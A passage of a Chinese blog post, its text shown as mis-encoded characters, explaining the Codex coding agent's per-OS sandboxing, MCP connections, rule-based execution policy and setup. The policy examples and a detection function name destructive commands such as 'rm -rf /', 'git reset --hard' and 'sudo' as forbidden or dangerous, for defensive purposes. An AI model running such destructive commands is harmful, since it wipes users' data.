<p>æ²™ç®±å°±æ˜¯ä¸ºäº†é˜²æ­¢è¿™ç§ç¾éš¾æ€§çš„æ“ä½œã€‚</p>
<h4 data-id="heading-40">æ²™ç®±åŸç†</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">
graph TB
    subgraph Request["å‘½ä»¤è¯·æ±‚"]
        Cmd["æ‰§è¡Œå‘½ä»¤: npm test"]
    end

    subgraph PolicyCheck["ç­–ç•¥æ£€æŸ¥"]
        EP["æ‰§è¡Œç­–ç•¥å¼•æ“"]
        Decision{"å†³ç­–"}
    end

    subgraph SandboxSelect["æ²™ç®±é€‰æ‹©"]
        Platform{"æ“ä½œç³»ç»Ÿ?"}
        MacOS["macOS: Seatbelt"]
        Linux["Linux: Landlock + Seccomp"]
        Windows["Windows: RestrictedToken"]
    end

    subgraph Permissions["æƒé™æ§åˆ¶"]
        FS["æ–‡ä»¶ç³»ç»Ÿè®¿é—®"]
        Net["ç½‘ç»œè®¿é—®"]
        Proc["è¿›ç¨‹æƒé™"]
    end

    subgraph Execution["æ‰§è¡Œç¯å¢ƒ"]
        Isolated["éš”ç¦»è¿›ç¨‹"]
        Result["æ‰§è¡Œç»“æœ"]
    end

    Cmd --&gt; EP
    EP --&gt; Decision

    Decision --&gt;|"allow"| Platform
    Decision --&gt;|"prompt"| UserApproval["ç”¨æˆ·å®¡æ‰¹"]
    Decision --&gt;|"forbidden"| Blocked["æ‹’ç»æ‰§è¡Œ"]

    UserApproval --&gt;|"æ‰¹å‡†"| Platform
    UserApproval --&gt;|"æ‹’ç»"| Blocked

    Platform --&gt;|"darwin"| MacOS
    Platform --&gt;|"linux"| Linux
    Platform --&gt;|"win32"| Windows

    MacOS --&gt; FS
    Linux --&gt; FS
    Windows --&gt; FS

    FS --&gt; Net
    Net --&gt; Proc
    Proc --&gt; Isolated
    Isolated --&gt; Result

    style Request fill:#E3F2FD,stroke:#1976D2
    style PolicyCheck fill:#FFF3E0,stroke:#F57C00
    style SandboxSelect fill:#E8F5E9,stroke:#388E3C
    style Permissions fill:#FCE4EC,stroke:#C2185B
    style Execution fill:#F3E5F5,stroke:#7B1FA2
    style Blocked fill:#FFCDD2,stroke:#D32F2F

</code></pre>
<h4 data-id="heading-41">ä¸‰ç§æ²™ç®±ç­–ç•¥</h4>





























<table><thead><tr><th>ç­–ç•¥</th><th>æ–‡ä»¶æƒé™</th><th>ç½‘ç»œæƒé™</th><th>é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td><code>read-only</code></td><td>åªè¯»</td><td>ç¦æ­¢</td><td>ä»£ç å®¡æŸ¥</td></tr><tr><td><code>workspace-write</code></td><td>å·¥ä½œåŒºå¯å†™</td><td>å¯é…ç½®</td><td>æ—¥å¸¸å¼€å‘</td></tr><tr><td><code>danger-full-access</code></td><td>å®Œå…¨è®¿é—®</td><td>å…è®¸</td><td>ç‰¹æ®Šåœºæ™¯</td></tr></tbody></table>
<h4 data-id="heading-42">è·¨å¹³å°æ²™ç®±å®ç°</h4>
<p>Codex é’ˆå¯¹ä¸åŒæ“ä½œç³»ç»Ÿä½¿ç”¨ä¸åŒçš„æ²™ç®±æŠ€æœ¯ï¼š</p>
<h5 data-id="heading-43">macOS: Seatbelt</h5>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// ç”Ÿæˆ SBPLï¼ˆSeatbelt Profile Languageï¼‰ç­–ç•¥</span>
<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">profile</span> = <span class="hljs-built_in">format!</span>(<span class="hljs-string">r#"
    (version 1)
    (deny default)
    (allow file-read* (subpath "{writable_root}"))
    (allow file-write* (subpath "{writable_root}"))
    (deny network*)
"#</span>);
</code></pre>
<h5 data-id="heading-44">Linux: Landlock + Seccomp</h5>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// Landlockï¼šé™åˆ¶æ–‡ä»¶ç³»ç»Ÿè®¿é—®</span>
<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">ruleset</span> = Ruleset::<span class="hljs-title function_ invoke__">new</span>()
    .<span class="hljs-title function_ invoke__">handle_access</span>(AccessFs::ReadFile)?
    .<span class="hljs-title function_ invoke__">create</span>()?;

<span class="hljs-comment">// Seccompï¼šé˜»æ­¢å±é™©çš„ç³»ç»Ÿè°ƒç”¨</span>
<span class="hljs-title function_ invoke__">seccomp_rule_add</span>(ctx, <span class="hljs-title function_ invoke__">SCMP_ACT_ERRNO</span>(EPERM),
    <span class="hljs-title function_ invoke__">SCMP_SYS</span>(connect), <span class="hljs-number">0</span>)?;  <span class="hljs-comment">// ç¦æ­¢ç½‘ç»œè¿æ¥</span>
</code></pre>
<h5 data-id="heading-45">Windows: RestrictedToken</h5>
<p>ä½¿ç”¨ Windows çš„å—é™ä»¤ç‰Œå’Œ ACLï¼ˆè®¿é—®æ§åˆ¶åˆ—è¡¨ï¼‰æ¥é™åˆ¶æƒé™ã€‚</p>
<h4 data-id="heading-46">æ²™ç®±ç»•è¿‡æœºåˆ¶</h4>
<p>æœ‰æ—¶å€™ç¡®å®éœ€è¦æ‰§è¡Œå—é™çš„æ“ä½œï¼ŒCodex æä¾›äº†å®‰å…¨çš„å‡çº§è·¯å¾„ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> AI è¯·æ±‚æ‰§è¡Œéœ€è¦é¢å¤–æƒé™çš„å‘½ä»¤
<span class="hljs-bullet">2.</span> å‘ç”¨æˆ·æ˜¾ç¤ºæƒé™æå‡è¯·æ±‚
<span class="hljs-bullet">3.</span> ç”¨æˆ·ç¡®è®¤åï¼Œåœ¨æ²™ç®±å¤–æ‰§è¡Œ
<span class="hljs-bullet">4.</span> è®°å½•æ“ä½œæ—¥å¿—
</code></pre>
<hr/>
<h3 data-id="heading-47">MCP åè®®ï¼šè¿æ¥å¤–éƒ¨ä¸–ç•Œçš„æ¡¥æ¢</h3>
<h4 data-id="heading-48">ä»€ä¹ˆæ˜¯ MCPï¼Ÿ</h4>
<p><strong>MCPï¼ˆModel Context Protocolï¼‰</strong> æ˜¯ä¸€ä¸ªå¼€æ”¾åè®®ï¼Œè®© AI åŠ©æ‰‹èƒ½å¤Ÿä¸å¤–éƒ¨å·¥å…·å’ŒæœåŠ¡äº¤äº’ã€‚å¯ä»¥æŠŠå®ƒæƒ³è±¡æˆ AI ä¸–ç•Œçš„"USB æ¥å£"ã€‚</p>
<pre><code class="hljs language-mermaid" lang="mermaid">
graph LR
    subgraph CodexCore["Codex æ ¸å¿ƒ"]
        MCPManager["MCP è¿æ¥ç®¡ç†å™¨"]
        ToolRouter["å·¥å…·è·¯ç”±å™¨"]
    end

    subgraph MCPClients["MCP å®¢æˆ·ç«¯è¿æ¥"]
        Client1["RmcpClient #1"]
        Client2["RmcpClient #2"]
        Client3["RmcpClient #3"]
    end

    subgraph Transport["ä¼ è¾“å±‚"]
        Stdio["Stdio ä¼ è¾“"]
        HTTP["HTTP ä¼ è¾“"]
        OAuth["OAuth è®¤è¯"]
    end

    subgraph MCPServers["MCP æœåŠ¡å™¨"]
        GitHub["GitHub æœåŠ¡å™¨"]
        Slack["Slack æœåŠ¡å™¨"]
        Custom["è‡ªå®šä¹‰æœåŠ¡å™¨"]
    end

    subgraph Protocol["åè®®å±‚"]
        Init["1. åˆå§‹åŒ–æ¡æ‰‹"]
        ListTools["2. è·å–å·¥å…·åˆ—è¡¨"]
        CallTool["3. è°ƒç”¨å·¥å…·"]
        Result["4. è¿”å›ç»“æœ"]
    end

    ToolRouter --&gt; MCPManager
    MCPManager --&gt; Client1
    MCPManager --&gt; Client2
    MCPManager --&gt; Client3

    Client1 --&gt; Stdio
    Client2 --&gt; HTTP
    Client3 --&gt; OAuth

    Stdio --&gt; GitHub
    HTTP --&gt; Custom
    OAuth --&gt; Slack

    GitHub --&gt; Init
    Init --&gt; ListTools
    ListTools --&gt; CallTool
    CallTool --&gt; Result

    style CodexCore fill:#E3F2FD,stroke:#1976D2
    style MCPClients fill:#E8F5E9,stroke:#388E3C
    style Transport fill:#FFF3E0,stroke:#F57C00
    style MCPServers fill:#F3E5F5,stroke:#7B1FA2
    style Protocol fill:#E0F7FA,stroke:#00838F


</code></pre>
<h4 data-id="heading-49">MCP çš„è§’è‰²</h4>
<p>Codex å¯ä»¥åŒæ—¶ä½œä¸ºï¼š</p>
<ul>
<li><strong>MCP å®¢æˆ·ç«¯</strong>ï¼šè°ƒç”¨å…¶ä»– MCP æœåŠ¡å™¨æä¾›çš„å·¥å…·</li>
<li><strong>MCP æœåŠ¡å™¨</strong>ï¼šè®©å…¶ä»–åº”ç”¨è°ƒç”¨ Codex çš„èƒ½åŠ›</li>
</ul>
<h4 data-id="heading-50">è¿æ¥å¤–éƒ¨æœåŠ¡ç¤ºä¾‹</h4>
<pre><code class="hljs language-toml" lang="toml"><span class="hljs-comment"># ~/.codex/config.toml</span>

<span class="hljs-section">[mcp_servers.github]</span>
<span class="hljs-attr">enabled</span> = <span class="hljs-literal">true</span>

<span class="hljs-section">[mcp_servers.github.transport]</span>
<span class="hljs-attr">type</span> = <span class="hljs-string">"stdio"</span>
<span class="hljs-attr">command</span> = <span class="hljs-string">"npx"</span>
<span class="hljs-attr">args</span> = [<span class="hljs-string">"@modelcontextprotocol/server-github"</span>]
</code></pre>
<p>é…ç½®åï¼ŒCodex å°±èƒ½ä½¿ç”¨ GitHub çš„åŠŸèƒ½ï¼š</p>
<pre><code class="hljs language-less" lang="less">ç”¨æˆ·: å¸®æˆ‘åˆ›å»ºä¸€ä¸ª <span class="hljs-selector-tag">issue</span> æŠ¥å‘Šè¿™ä¸ª <span class="hljs-selector-tag">bug</span>
<span class="hljs-selector-tag">Codex</span>: å¥½çš„ï¼Œæˆ‘æ¥è°ƒç”¨ <span class="hljs-selector-tag">GitHub</span> <span class="hljs-selector-tag">MCP</span> æœåŠ¡å™¨åˆ›å»º <span class="hljs-selector-tag">issue</span>...
       <span class="hljs-selector-attr">[è°ƒç”¨ mcp__github__create_issue å·¥å…·]</span>
       <span class="hljs-selector-tag">Issue</span> å·²åˆ›å»ºï¼š<span class="hljs-selector-tag">https</span>:<span class="hljs-comment">//github.com/xxx/xxx/issues/123</span>
</code></pre>
<h4 data-id="heading-51">MCP é€šä¿¡æµç¨‹</h4>
<pre><code class="hljs language-markdown" lang="markdown">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”     JSON-RPC      â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   Codex     â”‚ â—„â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–º â”‚  MCP æœåŠ¡å™¨  â”‚
â”‚  (å®¢æˆ·ç«¯)   â”‚    over stdio    â”‚  (GitHub)   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

<span class="hljs-bullet">1.</span> åˆå§‹åŒ–æ¡æ‰‹ï¼šäº¤æ¢èƒ½åŠ›å£°æ˜
<span class="hljs-bullet">2.</span> å·¥å…·åˆ—è¡¨ï¼šè·å–å¯ç”¨å·¥å…·
<span class="hljs-bullet">3.</span> å·¥å…·è°ƒç”¨ï¼šæ‰§è¡Œå…·ä½“æ“ä½œ
<span class="hljs-bullet">4.</span> è¿”å›ç»“æœï¼šè·å–æ‰§è¡Œç»“æœ
</code></pre>
<h4 data-id="heading-52">æ”¯æŒçš„ä¼ è¾“æ–¹å¼</h4>

























<table><thead><tr><th>ä¼ è¾“æ–¹å¼</th><th>é€‚ç”¨åœºæ™¯</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td>stdio</td><td>æœ¬åœ°è¿›ç¨‹</td><td>npx å¯åŠ¨çš„å·¥å…·</td></tr><tr><td>HTTP</td><td>è¿œç¨‹æœåŠ¡</td><td>äº‘ç«¯ API</td></tr><tr><td>HTTP + OAuth</td><td>éœ€è¦è®¤è¯çš„æœåŠ¡</td><td>GitHub, Slack</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-53">æ‰§è¡Œç­–ç•¥ï¼šæ™ºèƒ½çš„æƒé™ç®¡ç†</h3>
<h4 data-id="heading-54">é—®é¢˜ï¼šå¦‚ä½•åˆ¤æ–­å‘½ä»¤æ˜¯å¦å®‰å…¨ï¼Ÿ</h4>
<p>ä¸æ˜¯æ‰€æœ‰å‘½ä»¤éƒ½åŒæ ·å±é™©ï¼š</p>
<ul>
<li><code>ls</code> å®Œå…¨å®‰å…¨</li>
<li><code>npm test</code> é€šå¸¸å®‰å…¨</li>
<li><code>rm -rf /</code> ç»å¯¹å±é™©</li>
<li><code>git push</code> éœ€è¦ç¡®è®¤</li>
</ul>
<h4 data-id="heading-55">è§£å†³æ–¹æ¡ˆï¼šæ‰§è¡Œç­–ç•¥å¼•æ“</h4>
<p>Codex ä½¿ç”¨åŸºäºè§„åˆ™çš„æ‰§è¡Œç­–ç•¥ç³»ç»Ÿï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">
flowchart TD
    Start["å‘½ä»¤: git push origin main"] --&gt; Parse["è§£æå‘½ä»¤ tokens"]
    Parse --&gt; Lookup["æŸ¥æ‰¾åŒ¹é…è§„åˆ™"]

    subgraph Rules["è§„åˆ™åº“"]
        R1["prefix_rule(['ls'], 'allow')"]
        R2["prefix_rule(['git', 'push'], 'prompt')"]
        R3["prefix_rule(['rm', '-rf'], 'forbidden')"]
    end

    Lookup --&gt; R1
    Lookup --&gt; R2
    Lookup --&gt; R3

    R1 --&gt; Match{"åŒ¹é…æ£€æŸ¥"}
    R2 --&gt; Match
    R3 --&gt; Match

    Match --&gt;|"åŒ¹é… R2"| Collect["æ”¶é›†åŒ¹é…ç»“æœ"]
    Match --&gt;|"æ— åŒ¹é…"| Heuristics["å¯å‘å¼æ£€æŸ¥"]

    Heuristics --&gt;|"å®‰å…¨å‘½ä»¤"| AllowH["Decision: Allow"]
    Heuristics --&gt;|"å±é™©å‘½ä»¤"| PromptH["Decision: Prompt"]

    Collect --&gt; MaxDecision["é€‰æ‹©æœ€ä¸¥æ ¼å†³ç­–"]

    MaxDecision --&gt; FinalAllow["Allow: ç›´æ¥æ‰§è¡Œ"]
    MaxDecision --&gt; FinalPrompt["Prompt: è¯·æ±‚ç”¨æˆ·æ‰¹å‡†"]
    MaxDecision --&gt; FinalForbid["Forbidden: æ‹’ç»æ‰§è¡Œ"]

    AllowH --&gt; FinalAllow
    PromptH --&gt; FinalPrompt

    FinalPrompt --&gt; UserChoice{"ç”¨æˆ·é€‰æ‹©"}
    UserChoice --&gt;|"æ‰¹å‡†"| Execute["æ‰§è¡Œå‘½ä»¤"]
    UserChoice --&gt;|"ç™½åå•"| Whitelist["æ·»åŠ  allow è§„åˆ™"]
    UserChoice --&gt;|"æ‹’ç»"| Reject["å–æ¶ˆæ‰§è¡Œ"]

    Whitelist --&gt; Execute

    style Start fill:#2196F3,color:#fff
    style FinalAllow fill:#4CAF50,color:#fff
    style FinalPrompt fill:#FF9800,color:#fff
    style FinalForbid fill:#F44336,color:#fff
    style Rules fill:#E8F5E9,stroke:#388E3C

</code></pre>
<h4 data-id="heading-56">ç­–ç•¥æ–‡ä»¶æ ¼å¼</h4>
<p>ç­–ç•¥æ–‡ä»¶ä½¿ç”¨ç±» Python çš„ Starlark è¯­è¨€ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ~/.codex/policy/default.codexpolicy</span>

<span class="hljs-comment"># å…è®¸å¸¸è§çš„å®‰å…¨å‘½ä»¤</span>
prefix_rule(
    pattern = [<span class="hljs-string">"ls"</span>],
    decision = <span class="hljs-string">"allow"</span>,
)

prefix_rule(
    pattern = [<span class="hljs-string">"cat"</span>],
    decision = <span class="hljs-string">"allow"</span>,
)

<span class="hljs-comment"># éœ€è¦ç¡®è®¤çš„å‘½ä»¤</span>
prefix_rule(
    pattern = [<span class="hljs-string">"git"</span>, [<span class="hljs-string">"push"</span>, <span class="hljs-string">"pull"</span>, <span class="hljs-string">"fetch"</span>]],
    decision = <span class="hljs-string">"prompt"</span>,
)

<span class="hljs-comment"># ç¦æ­¢å±é™©å‘½ä»¤</span>
prefix_rule(
    pattern = [<span class="hljs-string">"rm"</span>, <span class="hljs-string">"-rf"</span>],
    decision = <span class="hljs-string">"forbidden"</span>,
)
</code></pre>
<h4 data-id="heading-57">å†³ç­–ä¼˜å…ˆçº§</h4>
<p>å½“å¤šä¸ªè§„åˆ™åŒ¹é…æ—¶ï¼Œé‡‡ç”¨æœ€ä¸¥æ ¼çš„å†³ç­–ï¼š</p>
<pre><code class="hljs">forbiddenï¼ˆç¦æ­¢ï¼‰ &gt; promptï¼ˆæç¤ºï¼‰ &gt; allowï¼ˆå…è®¸ï¼‰
</code></pre>
<h4 data-id="heading-58">å†…ç½®å®‰å…¨æ£€æµ‹</h4>
<p>é™¤äº†æ˜¾å¼è§„åˆ™ï¼ŒCodex è¿˜æœ‰å†…ç½®çš„å¯å‘å¼å®‰å…¨æ£€æµ‹ï¼š</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// å·²çŸ¥çš„å®‰å…¨å‘½ä»¤ï¼ˆ27ä¸ªï¼‰</span>
<span class="hljs-keyword">const</span> SAFE_COMMANDS: &amp;[&amp;<span class="hljs-type">str</span>] = &amp;[
    <span class="hljs-string">"cat"</span>, <span class="hljs-string">"echo"</span>, <span class="hljs-string">"ls"</span>, <span class="hljs-string">"pwd"</span>, <span class="hljs-string">"grep"</span>, <span class="hljs-string">"head"</span>, <span class="hljs-string">"tail"</span>,
    <span class="hljs-string">"wc"</span>, <span class="hljs-string">"sort"</span>, <span class="hljs-string">"uniq"</span>, <span class="hljs-string">"diff"</span>, <span class="hljs-string">"file"</span>, <span class="hljs-string">"which"</span>, <span class="hljs-string">"date"</span>,
    <span class="hljs-string">"env"</span>, <span class="hljs-string">"printenv"</span>, <span class="hljs-string">"hostname"</span>, <span class="hljs-string">"uname"</span>, <span class="hljs-string">"whoami"</span>,
    <span class="hljs-comment">// ...</span>
];

<span class="hljs-comment">// å±é™©å‘½ä»¤æ£€æµ‹</span>
<span class="hljs-keyword">fn</span> <span class="hljs-title function_">is_dangerous_command</span>(cmd: &amp;[<span class="hljs-type">String</span>]) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">bool</span> {
    matches!(cmd,
        [<span class="hljs-string">"rm"</span>, <span class="hljs-string">"-rf"</span>, ..] |
        [<span class="hljs-string">"git"</span>, <span class="hljs-string">"reset"</span>, <span class="hljs-string">"--hard"</span>, ..] |
        [<span class="hljs-string">"sudo"</span>, ..] |
        <span class="hljs-comment">// ...</span>
    )
}
</code></pre>
<h4 data-id="heading-59">åŠ¨æ€ç™½åå•</h4>
<p>å½“ä½ æ‰¹å‡†ä¸€ä¸ªå‘½ä»¤åï¼Œå¯ä»¥é€‰æ‹©"ç™½åå•æ­¤å‘½ä»¤"ï¼ŒCodex ä¼šè‡ªåŠ¨æ›´æ–°ç­–ç•¥æ–‡ä»¶ï¼š</p>
<pre><code class="hljs language-starlark" lang="starlark"># è‡ªåŠ¨æ·»åŠ çš„è§„åˆ™
prefix_rule(pattern=["npm", "test"], decision="allow")
</code></pre>
<hr/>
<h3 data-id="heading-60">å¦‚ä½•ä½¿ç”¨ Codex</h3>
<h4 data-id="heading-61">å®‰è£…æ–¹å¼</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ–¹å¼ 1ï¼šé€šè¿‡ npm å®‰è£…</span>
npm install -g @openai/codex

<span class="hljs-comment"># æ–¹å¼ 2ï¼šé€šè¿‡ Homebrew å®‰è£…ï¼ˆmacOSï¼‰</span>
brew install --cask codex
</code></pre>
<h4 data-id="heading-62">ç™»å½•è®¤è¯</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä½¿ç”¨ ChatGPT è´¦æˆ·ç™»å½•ï¼ˆæ¨èï¼‰</span>
codex login

<span class="hljs-comment"># æˆ–è€…ä½¿ç”¨ API Key</span>
<span class="hljs-built_in">export</span> CODEX_API_KEY=sk-xxx
</code></pre>
<h4 data-id="heading-63">åŸºæœ¬ä½¿ç”¨</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å¯åŠ¨äº¤äº’å¼ç•Œé¢</span>
codex

<span class="hljs-comment"># ç›´æ¥æ‰§è¡Œä»»åŠ¡ï¼ˆéäº¤äº’å¼ï¼‰</span>
codex <span class="hljs-built_in">exec</span> <span class="hljs-string">"å¸®æˆ‘å†™ä¸€ä¸ªå¿«é€Ÿæ’åºå‡½æ•°"</span>

<span class="hljs-comment"># åœ¨ç‰¹å®šç›®å½•å·¥ä½œ</span>
codex --<span class="hljs-built_in">cd</span> /path/to/project
</code></pre>
<h4 data-id="heading-64">TypeScript SDK ä½¿ç”¨</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">Codex</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"@openai/codex-sdk"</span>;

<span class="hljs-keyword">const</span> codex = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Codex</span>();
<span class="hljs-keyword">const</span> thread = codex.<span class="hljs-title function_">startThread</span>({
    <span class="hljs-attr">model</span>: <span class="hljs-string">"gpt-4"</span>,
    <span class="hljs-attr">sandboxMode</span>: <span class="hljs-string">"workspace-write"</span>,
    <span class="hljs-attr">workingDirectory</span>: <span class="hljs-string">"./my-project"</span>
});

<span class="hljs-comment">// åŒæ­¥æ¨¡å¼ï¼šç­‰å¾…å®Œæˆ</span>
<span class="hljs-keyword">const</span> turn = <span class="hljs-keyword">await</span> thread.<span class="hljs-title function_">run</span>(<span class="hljs-string">"å¸®æˆ‘ä¿®å¤æ‰€æœ‰çš„ TypeScript é”™è¯¯"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(turn.<span class="hljs-property">finalResponse</span>);

<span class="hljs-comment">// æµå¼æ¨¡å¼ï¼šå®æ—¶è·å–äº‹ä»¶</span>
<span class="hljs-keyword">const</span> { events } = <span class="hljs-keyword">await</span> thread.<span class="hljs-title function_">runStreamed</span>(<span class="hljs-string">"è¿è¡Œæµ‹è¯•"</span>);
<span class="hljs-keyword">for</span> <span class="hljs-keyword">await</span> (<span class="hljs-keyword">const</span> event <span class="hljs-keyword">of</span> events) {
    <span class="hljs-keyword">if</span> (event.<span class="hljs-property">type</span> === <span class="hljs-string">"item.completed"</span>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"å®Œæˆ:"</span>, event.<span class="hljs-property">item</span>);
    }
}
</code></pre>
<h4 data-id="heading-65">é…ç½®æ–‡ä»¶</h4>
<pre><code class="hljs language-toml" lang="toml"><span class="hljs-comment"># ~/.codex/config.toml</span>

<span class="hljs-comment"># é»˜è®¤æ¨¡å‹</span>
<span class="hljs-attr">model</span> = <span class="hljs-string">"gpt-4-turbo"</span>

<span class="hljs-comment"># æ²™ç®±ç­–ç•¥</span>
<span class="hljs-attr">sandbox_policy</span> = <span class="hljs-string">"workspace-write"</span>

<span class="hljs-comment"># å®¡æ‰¹ç­–ç•¥</span>
<span class="hljs-attr">approval_policy</span> = <span class="hljs-string">"on-request"</span>

<span class="hljs-comment"># MCP æœåŠ¡å™¨é…ç½®</span>
<span class="hljs-section">[mcp_servers.github]</span>
<span class="hljs-attr">enabled</span> = <span class="hljs-literal">true</span>
<span class="hljs-section">[mcp_servers.github.transport]</span>
<span class="hljs-attr">type</span> = <span class="hljs-string">"stdio"</span>
<span class="hljs-attr">command</span> = <span class="hljs-string">"npx"</span>
<span class="hljs-attr">args</span> = [<span class="hljs-string">"@modelcontextprotocol/server-github"</span>]
</code></pre>
<h3 data-id="heading-66">æ€»ç»“</h3>
<h4 data-id="heading-67">Codex çš„è®¾è®¡å“²å­¦</h4>
<ol>
<li><strong>å®‰å…¨ç¬¬ä¸€</strong>ï¼šå¤šå±‚æ²™ç®±ã€æ‰§è¡Œç­–ç•¥ã€ç”¨æˆ·å®¡æ‰¹</li>
<li><strong>å¯æ‰©å±•æ€§</strong>ï¼šå·¥å…·ç³»ç»Ÿã€MCP åè®®ã€æ’ä»¶æ¶æ„</li>
<li><strong>æ™ºèƒ½ç®¡ç†</strong>ï¼šä¸Šä¸‹æ–‡å‹ç¼©ã€è®°å¿†æŒä¹…åŒ–ã€Token ä¼˜åŒ–</li>
<li><strong>ç”¨æˆ·ä½“éªŒ</strong>ï¼šäº¤äº’å¼ç•Œé¢ã€æµå¼è¾“å‡ºã€æ–­ç‚¹ç»­ä¼ </li>
</ol>
<h4 data-id="heading-68">æŠ€æœ¯äº®ç‚¹</h4>



































<table><thead><tr><th>ç‰¹æ€§</th><th>æŠ€æœ¯å®ç°</th><th>ä¼˜åŠ¿</th></tr></thead><tbody><tr><td>æ€§èƒ½</td><td>Rust æ ¸å¿ƒ</td><td>æ¥è¿‘åŸç”Ÿé€Ÿåº¦</td></tr><tr><td>å®‰å…¨</td><td>å¤šå¹³å°æ²™ç®±</td><td>ç³»ç»Ÿçº§éš”ç¦»</td></tr><tr><td>æ‰©å±•</td><td>MCP åè®®</td><td>å¼€æ”¾ç”Ÿæ€</td></tr><tr><td>æ™ºèƒ½</td><td>ä¸Šä¸‹æ–‡å·¥ç¨‹</td><td>é«˜æ•ˆåˆ©ç”¨æ¨¡å‹èƒ½åŠ›</td></tr><tr><td>ä½“éªŒ</td><td>SQ/EQ å¼‚æ­¥æ¨¡å¼</td><td>æµç•…çš„äº¤äº’</td></tr></tbody></table>
<h4 data-id="heading-69">æœªæ¥å±•æœ›</h4>
<p>Codex ä»£è¡¨äº† AI ç¼–ç¨‹åŠ©æ‰‹çš„ä¸€ä¸ªé‡è¦æ–¹å‘ï¼šä»"å»ºè®®"èµ°å‘"æ‰§è¡Œ"ï¼Œä»"å¯¹è¯"èµ°å‘"åä½œ"ã€‚éšç€ AI èƒ½åŠ›çš„æå‡å’Œå·¥å…·ç”Ÿæ€çš„å®Œå–„ï¼Œæˆ‘ä»¬å¯ä»¥æœŸå¾…æ›´åŠ æ™ºèƒ½ã€å®‰å…¨ã€é«˜æ•ˆçš„ç¼–ç¨‹åŠ©æ‰‹ã€‚</p>
<hr/>
<h3 data-id="heading-70">é™„å½•ï¼šå…³é”®æ–‡ä»¶è·¯å¾„é€ŸæŸ¥</h3>













































<table><thead><tr><th>ç»„ä»¶</th><th>è·¯å¾„</th></tr></thead><tbody><tr><td>æ ¸å¿ƒå¼•æ“</td><td><code>codex-rs/core/src/codex.rs</code></td></tr><tr><td>TUI ç•Œé¢</td><td><code>codex-rs/tui/src/app.rs</code></td></tr><tr><td>å·¥å…·ç³»ç»Ÿ</td><td><code>codex-rs/core/src/tools/</code></td></tr><tr><td>æ²™ç®±å®ç°</td><td><code>codex-rs/core/src/sandboxing/</code></td></tr><tr><td>æ‰§è¡Œç­–ç•¥</td><td><code>codex-rs/execpolicy/src/</code></td></tr><tr><td>MCP å®¢æˆ·ç«¯</td><td><code>codex-rs/rmcp-client/src/</code></td></tr><tr><td>ä¸Šä¸‹æ–‡ç®¡ç†</td><td><code>codex-rs/core/src/context_manager/</code></td></tr><tr><td>è®°å¿†ç³»ç»Ÿ</td><td><code>codex-rs/core/src/message_history.rs</code></td></tr><tr><td>TypeScript SDK</td><td><code>sdk/typescript/src/</code></td></tr></tbody></table>
<hr/>
<ul>
<li>ä½œè€…ã€<strong>å‰ç«¯é¢†ç§€</strong>ã€‘ä¸€ä¸ªå–œæ¬¢æ¢ç´¢å‰ç«¯é¢†åŸŸAIèµ‹èƒ½çš„å¼€å‘è€…ï¼Œå–œæ¬¢æˆ‘çš„å¯ä»¥å…³æ³¨æˆ‘ï¼Œç§ä¿¡æˆ‘é‚€è¯·è¿›å…¥æŠ€æœ¯ç¾¤ï¼Œæˆ‘ä¼šæ—¶åˆ»åˆ†äº«æœ€æ–°å‰æ²¿AIæŠ€æœ¯ï¼›</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1736e8fdc0aa4d24b9765b4f9749ba8b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56C06IynNjg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768537577&amp;x-signature=vIjb9dk8v8jFPxxjcMWQYCT2y%2FE%3D" alt="æ‰«ç _æœç´¢è”åˆä¼ æ’­æ ·å¼-ç™½è‰²ç‰ˆ.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[åˆ°åº•æ˜¯ç”¨nuxtçš„publicè¿˜æ˜¯assetsï¼Ÿä¸€ç¯‡æ–‡ç« å¼€æ‚Ÿ]]></title>    <link>https://juejin.cn/post/7592912896591298579</link>    <guid>https://juejin.cn/post/7592912896591298579</guid>    <pubDate>2026-01-09T03:03:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592912896591298579" data-draft-id="7592710766010531850" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" 